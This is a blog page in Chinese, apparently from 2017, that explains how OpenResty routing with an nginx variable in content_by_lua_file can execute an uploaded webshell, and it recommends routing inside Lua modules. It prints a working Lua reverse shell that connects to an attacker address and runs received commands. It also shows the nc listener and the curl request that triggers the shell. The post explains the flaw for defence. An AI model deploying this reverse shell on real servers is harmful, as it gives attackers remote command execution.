@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="关于 Lua, OpenResty | poslua, linux, 性能, 安全, 计算机技术 | 这里是 @ms2008 的个人博客，与你一起发现更大的世界。">
+    <meta name="keywords"  content="poslua, Lua, LuaJIT, OpenResty, ms2008, Python, Golang, Linux, Web, 互联网">
+    <meta name="theme-color" content="#000000">
+    
+    <title>OpenResty 中的安全隐患 - poslua | ms2008 Blog</title>
+
+    <!-- Web App Manifest -->
+    <link rel="manifest" href="/pwa/manifest.json">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="http://0.0.0.0:4000/2017/06/05/security/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Poslua Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/portfolio/">Portfolio</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/tags/">Tags</a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    var __HuxNav__ = {
+        close: function(){
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        },
+        open: function(){
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+
+    // Bind Event
+    $toggle.addEventListener('click', function(e){
+        if ($navbar.className.indexOf('in') > 0) {
+            __HuxNav__.close()
+        }else{
+            __HuxNav__.open()
+        }
+    })
+
+    /**
+     * Since Fastclick is used to delegate 'touchstart' globally
+     * to hack 300ms delay in iOS by performing a fake 'click',
+     * Using 'e.stopPropagation' to stop 'touchstart' event from 
+     * $toggle/$collapse will break global delegation.
+     * 
+     * Instead, we use a 'e.target' filter to prevent handler
+     * added to document close HuxNav.  
+     *
+     * Also, we use 'click' instead of 'touchstart' as compromise
+     */
+    document.addEventListener('click', function(e){
+        if(e.target == $toggle) return;
+        if(e.target.className == 'icon-bar') return;
+        __HuxNav__.close();
+    })
+</script>
+
+
+    <!-- Image to hack wechat -->
+<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="/img/post-bg-2015.jpg" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        position: relative;
+        background-image: url('/img/post-bg-2015.jpg')
+    }
+
+    
+</style>
+<header class="intro-header" >
+    <div class="header-mask"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#Lua" title="Lua">Lua</a>
+                        
+                        <a class="tag" href="/tags/#OpenResty" title="OpenResty">OpenResty</a>
+                        
+                    </div>
+                    <h1>OpenResty 中的安全隐患</h1>
+                    
+                    
+                    <h2 class="subheading"></h2>
+                    
+                    <span class="meta">Posted by ms2008 on June 5, 2017</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <!-- Multi-Lingual -->
+                
+
+				<p>在 OR 的官方 GitHub 中，介绍了这么一种简单的「路由」写法</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># use nginx var in code path</span>
+<span class="c1"># CAUTION: contents in nginx var must be carefully filtered,</span>
+<span class="c1"># otherwise there'll be great security risk!</span>
+<span class="nv">location</span> <span class="o">~</span> <span class="o">^</span><span class="sr">/app/</span><span class="p">([</span><span class="o">-</span><span class="nv">_a</span><span class="o">-</span><span class="nv">zA</span><span class="o">-</span><span class="nv">Z0</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="p">]</span><span class="o">+</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">set</span> <span class="nv">$path</span> <span class="nv">$1</span><span class="p">;</span>
+    <span class="nv">content_by_lua_file</span> <span class="sr">/path/</span><span class="nv">to</span><span class="sr">/lua/</span><span class="nv">app</span><span class="sr">/root/</span><span class="nv">$path</span><span class="o">.</span><span class="nv">lua</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>相信不少不同学也都使用了这种简便的方式。然而却忽略了春哥的警告：</p>
+<blockquote>
+  <p><strong>CAUTION: contents in nginx var must be carefully filtered, otherwise there’ll be great security risk!</strong></p>
+</blockquote>
+
+<p>这里我来说下这个安全隐患是如何产生的。假如我们现在的路由结构是：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root/
+├── fan.lua
+├── follower.lua
+└── user.lua
+</code></pre></div></div>
+
+<p>正常情况下我们请求 <code class="highlighter-rouge">/app/user</code> 就应该执行 <code class="highlighter-rouge">root/user.lua</code> 代码；<code class="highlighter-rouge">/app/follower</code> 就应该执行 <code class="highlighter-rouge">root/follower.lua</code> 代码。这是我们期待的结果。</p>
+
+<p>但是假如你的服务器有文件上传漏洞或 SQL 注入漏洞，被攻击者利用进而植入了一个 <code class="highlighter-rouge">shell.lua</code> 的 webshell，那么现在我们的路由结构是：</p>
+<blockquote>
+  <p>SQL 注入不仅仅可以拖库，也是可以写 shell 的(SELECT OUTFILE)</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root/
+├── fan.lua
+├── follower.lua
+├── user.lua
+└── shell.lua
+</code></pre></div></div>
+
+<p>这时候去请求 <code class="highlighter-rouge">/app/shell</code>，就自然的去连接这个 webshell 了，这个 <code class="highlighter-rouge">shell.lua</code> 看起来是这个样子（反弹shell到攻击者的地址）：</p>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">sock</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">socket</span><span class="p">.</span><span class="n">tcp</span><span class="p">()</span>
+<span class="kd">local</span> <span class="n">ok</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">sock</span><span class="p">:</span><span class="n">connect</span><span class="p">(</span><span class="s2">"192.168.3.5"</span><span class="p">,</span> <span class="s2">"2333"</span><span class="p">)</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">ok</span> <span class="k">then</span> <span class="k">return</span> <span class="k">end</span>
+
+<span class="k">while</span> <span class="kc">true</span> <span class="k">do</span>
+    <span class="kd">local</span> <span class="n">r</span><span class="p">,</span><span class="n">x</span> <span class="o">=</span> <span class="n">sock</span><span class="p">:</span><span class="n">receive</span><span class="p">()</span>
+    <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">assert</span><span class="p">(</span><span class="nb">io.popen</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="s2">"r"</span><span class="p">))</span>
+    <span class="kd">local</span> <span class="n">b</span> <span class="o">=</span> <span class="nb">assert</span><span class="p">(</span><span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*a"</span><span class="p">))</span>
+    <span class="n">sock</span><span class="p">:</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+<span class="n">sock</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>我先在我的攻击机上执行（准备接收反弹回来的shell）</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvv 2333
+</code></pre></div></div>
+
+<p>开启另一个终端执行</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://victim/app/shell
+</code></pre></div></div>
+
+<p>回到 nc 查看权限：</p>
+
+<p><img src="/img/in-post/attacker.png" alt="" /></p>
+
+<p>接下来的就是去提权了。。。</p>
+
+<p>要避免这个问题，就是要在匹配路径上做出更为严格的限制，但是这会导致nginx.conf可读性较差。</p>
+
+<p>我的建议是路由还是直接放在 lua 里完成，这样我们的 handler() 可以获得更为安全的签名保护。反观今天的测试，其实本质上还是因为我们执行了不该信任的代码(没有签名)，最终导致系统沦陷。如果使用 lua 模块化(相当于签名)的路由方式，就可以避免这个问题（即使你拿到了上传或注入的漏洞，最多也就是拖个库，也不会拿到整个系统的权限）。</p>
+
+<hr />
+
+<p>有人说，时间是把杀猪刀。这很公平。但是，即使哪天挨上了这把杀猪刀，也希望自己是头优雅的猪。</p>
+
+<p>而此时，2017 已经过去 1/2</p>
+
+
+                <hr style="visibility: hidden;">
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2017/07/23/tcp-rst/" data-toggle="tooltip" data-placement="top" title="警惕系统中那些异常的 RST">
+                        Next<br>
+                        <span>警惕系统中那些异常的 RST</span>
+                        </a>
+                    </li>
+                    
+                </ul>
+
+
+                
+                <!-- disqus 评论框 start -->
+                <div class="comment">
+                    <div id="disqus_thread" class="disqus-thread"></div>
+                </div>
+                <!-- disqus 评论框 end -->
+                
+
+                
+            </div>  
+
+    <!-- Side Catalog Container -->
+        
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+        
+
+    <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+        				
+                            
+                				<a href="/tags/#Lua" title="Lua" rel="4">
+                                    Lua
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#OpenResty" title="OpenResty" rel="3">
+                                    OpenResty
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#TCP" title="TCP" rel="2">
+                                    TCP
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#Random" title="Random" rel="2">
+                                    Random
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#LuaJIT" title="LuaJIT" rel="2">
+                                    LuaJIT
+                                </a>
+                            
+        				
+                            
+        				
+        			</div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+                    
+                        <li><a href="http://ms2008.github.io">poslua</a></li>
+                    
+                        <li><a href="https://openresty.org/en/">OpenResty</a></li>
+                    
+                        <li><a href="http://lor.sumory.com/">Lor</a></li>
+                    
+                        <li><a href="http://luajit.org/">LuaJIT</a></li>
+                    
+                        <li><a href="https://www.python.org/">Python</a></li>
+                    
+                        <li><a href="https://golang.org/">Golang</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+<!-- disqus 公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "disqus_p43tdOmpxq";
+    var disqus_identifier = "/2017/06/05/security";
+    var disqus_url = "http://0.0.0.0:4000/2017/06/05/security/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+                    
+                    <li>
+                        <a href="https://twitter.com/ms2008vip">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+
+                    <!-- add Weibo, Zhihu by Hux, add target = "_blank" to <a> by Hux -->
+                    
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/ms2008">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+
+
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/ms2008">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Poslua Blog 2017
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=huxpro&repo=huxpro.github.io&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<!-- Currently, only navbar scroll-down effect at desktop still depends on this -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js "></script>
+
+<!-- Service Worker -->
+
+<script src="/js/snackbar.js "></script>
+<script src="/js/sw-registration.js "></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!--
+     Because of the native support for backtick-style fenced code blocks
+     right within the Markdown is landed in Github Pages,
+     From V1.6, There is no need for Highlight.js,
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/
+     - https://github.com/jneen/rouge/wiki/list-of-supported-languages-and-lexers
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async('/js/jquery.tagcloud.js',function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+<!-- Side Catalog -->
+
+<script type="text/javascript">
+    function generateCatalog (selector) {
+
+        // interop with multilangual 
+        /*
+        if () {
+            _containerSelector = 'div.post-container.active'
+        } else {
+            _containerSelector = 'div.post-container'
+        }
+        */
+
+        // init
+        // var P = $(_containerSelector),a,n,t,l,i,c;
+        var P = $('div.post-container'),a,n,t,l,i,c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        // clean
+        $(selector).html('')
+
+        // appending
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#"+$(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="'+i+'" rel="nofollow">'+t+'</a>');
+            l = $('<li class="'+n+'_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    // toggle side catalog
+    $(".catalog-toggle").click((function(e){
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    /*
+     * Doc: https://github.com/davist11/jQuery-One-Page-Nav
+     * Fork by Hux to support padding
+     */
+    async("/js/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+<!-- Multi-Lingual -->
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
